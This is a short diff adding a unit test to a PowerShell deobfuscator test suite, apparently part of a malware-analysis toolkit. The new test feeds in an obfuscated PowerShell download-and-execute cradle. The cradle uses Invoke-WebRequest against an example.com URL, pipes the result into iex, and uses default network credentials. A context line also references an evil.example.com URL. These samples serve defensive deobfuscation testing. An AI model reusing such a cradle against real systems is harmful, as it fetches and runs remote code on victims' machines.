@@ -31,3 +31,9 @@ class TestPowerShellDeobfuscator(TestUnitBase):
         extract = self.ldu('carve', 'ps1str', single=True, decode=True)
         self.assertIn(b'https://evil.example.com/boom',
             data | deob | extract | deob | bytes)
+
+    def test_format_string(self):
+        data = '''(  ITeM  VarIAbLe:2OF09b  ).VaLue::"dEFauLtneTwORkcrEdEnTiALs";.("{1}{0}"-f'wr','i')(("{4}{0}{8}{2}{3}{1}{5}{6}{7}"-f'/',':443','.','.com','http:/','/','download/p','owershell/','example'))-UseBasicParsing|&("{1}{0}" -f 'x','ie')  '''
+        deob = self.load()
+        test = data | deob | str
+        self.assertIn('example..com', test)
